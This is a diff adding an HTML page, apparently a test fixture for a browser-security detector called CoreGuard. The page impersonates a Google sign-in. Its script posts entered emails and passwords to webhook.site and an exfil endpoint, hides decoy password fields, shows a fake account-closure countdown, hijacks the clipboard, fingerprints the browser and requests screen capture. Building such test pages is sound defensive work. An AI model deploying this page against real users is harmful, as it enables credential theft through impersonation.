@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .btn-primary {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 16px;
+        }
+        
+        .btn-primary:hover {
+            background: #1765cc;
+        }
+        
+        .links {
+            margin-top: 24px;
+            font-size: 14px;
+        }
+        
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Hidden exfiltration elements */
+        .hidden-field {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+        
+        /* Urgency overlay (will trigger social engineering detection) */
+        .urgency-banner {
+            background: #d93025;
+            color: white;
+            padding: 12px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 1000;
+            display: none;
+        }
+        
+        .countdown {
+            font-weight: 700;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Urgency banner for social engineering detection -->
+    <div class="urgency-banner" id="urgencyBanner">
+        ⚠️ URGENT ACTION REQUIRED - Your account will be closed in <span class="countdown" id="countdown">05:00</span> minutes. Verify immediately to prevent permanent suspension!
+    </div>
+
+    <div class="login-container">
+        <!-- Google logo (should trigger brand impersonation detection) -->
+        <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+        </svg>
+        
+        <h1>Sign in</h1>
+        <p class="subtitle">Continue to Google Account</p>
+        
+        <form id="loginForm" action="https://example-exfil-endpoint.supabase.co/auth" method="POST">
+            <div class="input-group">
+                <label for="email">Email or phone</label>
+                <input type="email" id="email" name="email" required autocomplete="email">
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+            </div>
+            
+            <!-- Hidden fake input fields (should trigger fake input detection) -->
+            <input type="password" class="hidden-field" name="hidden_pass1" id="hidden_pass1">
+            <input type="text" class="hidden-field" name="hidden_user1" id="hidden_user1">
+            <input type="password" style="position: absolute; left: -9999px;" name="hidden_pass2">
+            
+            <button type="submit" class="btn-primary">Next</button>
+        </form>
+        
+        <div class="links">
+            <a href="#">Forgot email?</a>
+            <br><br>
+            <a href="#">Create account</a>
+        </div>
+    </div>
+
+    <script>
+        // This script will trigger multiple CoreGuard detections
+        
+        (function() {
+            // 1. Show urgency banner after 2 seconds (social engineering)
+            setTimeout(() => {
+                document.getElementById('urgencyBanner').style.display = 'block';
+                
+                // Countdown timer (urgency tactic)
+                let timeLeft = 300; // 5 minutes
+                const countdownEl = document.getElementById('countdown');
+                setInterval(() => {
+                    timeLeft--;
+                    const mins = Math.floor(timeLeft / 60);
+                    const secs = timeLeft % 60;
+                    countdownEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                }, 1000);
+            }, 2000);
+            
+            // 2. Clipboard hijacking attempts
+            let clipboardAttempts = 0;
+            document.addEventListener('copy', (e) => {
+                clipboardAttempts++;
+                if (clipboardAttempts > 2) {
+                    try {
+                        e.clipboardData.setData('text/plain', 'hijacked!');
+                        e.preventDefault();
+                    } catch (err) {}
+                }
+            });
+            
+            // 3. Simulate bot-like mouse movements
+            let mouseSimCount = 0;
+            const simulateBotMouse = setInterval(() => {
+                const event = new MouseEvent('mousemove', {
+                    clientX: Math.random() * window.innerWidth,
+                    clientY: Math.random() * window.innerHeight,
+                    bubbles: true
+                });
+                document.dispatchEvent(event);
+                mouseSimCount++;
+                if (mouseSimCount > 30) clearInterval(simulateBotMouse);
+            }, 10);
+            
+            // 4. WebRTC leak attempt
+            setTimeout(() => {
+                try {
+                    const pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('test');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                } catch (e) {}
+            }, 3000);
+            
+            // 5. Canvas fingerprinting
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                for (let i = 0; i < 15; i++) {
+                    ctx.fillText('fingerprint test ' + i, 10, 20);
+                    canvas.toDataURL();
+                }
+            }, 4000);
+            
+            // 6. Form submission with exfiltration endpoint
+            document.getElementById('loginForm').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                // Simulate rapid autofill interception
+                const passField = document.getElementById('password');
+                for (let i = 0; i < 10; i++) {
+                    passField.value = 'test' + i;
+                    passField.dispatchEvent(new Event('input', { bubbles: true }));
+                    await new Promise(r => setTimeout(r, 50));
+                }
+                
+                // Try to exfiltrate to suspicious endpoint
+                try {
+                    await fetch('https://webhook.site/test', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            email: document.getElementById('email').value,
+                            password: document.getElementById('password').value
+                        })
+                    });
+                } catch (e) {}
+                
+                alert('CoreGuard should have blocked this page by now!');
+            });
+            
+            // 7. High CPU usage (crypto mining simulation)
+            setTimeout(() => {
+                const start = Date.now();
+                let result = 0;
+                while (Date.now() - start < 2000) {
+                    result += Math.sqrt(Math.random());
+                }
+            }, 5000);
+            
+            // 8. Screen recording attempt
+            setTimeout(async () => {
+                try {
+                    await navigator.mediaDevices.getDisplayMedia({ video: true });
+                } catch (e) {
+                    // Expected to fail, but the attempt should be logged
+                }
+            }, 6000);
+            
+            // 9. Multiple network calls to exfil endpoints
+            setTimeout(() => {
+                fetch('https://firebaseio.com/test').catch(() => {});
+                fetch('https://pastebin.com/raw/test').catch(() => {});
+            }, 7000);
+            
+            // 10. Audio context fingerprinting
+            setTimeout(() => {
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    for (let i = 0; i < 5; i++) {
+                        audioCtx.createOscillator();
+                    }
+                } catch (e) {}
+            }, 8000);
+            
+        })();
+    </script>
+</body>
+</html>
